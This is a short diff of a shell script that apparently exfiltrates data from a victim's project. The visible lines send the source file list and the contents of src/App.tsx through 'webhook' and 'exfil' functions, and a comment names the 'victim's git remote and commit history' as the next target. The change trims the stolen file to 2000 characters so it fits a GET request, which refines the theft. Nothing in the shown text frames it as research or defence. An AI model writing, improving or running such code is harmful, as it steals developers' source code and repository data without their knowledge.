@@ -102,8 +102,8 @@ webhook "SOURCE_CODE" "$SRC_LIST"
 exfil "=== SOURCE CODE ===
 $SRC_LIST"
 
-# --- APP_TSX_CODE: application source code ---
-APP_TSX="$(cat src/App.tsx 2>/dev/null)"
+# --- APP_TSX_CODE: application source code (truncated to fit GET) ---
+APP_TSX="$(head -c 2000 src/App.tsx 2>/dev/null)"
 [ -n "$APP_TSX" ] && webhook "APP_TSX_CODE" "$APP_TSX"
 
 # --- GIT_LOG: victim's git remote and commit history ---
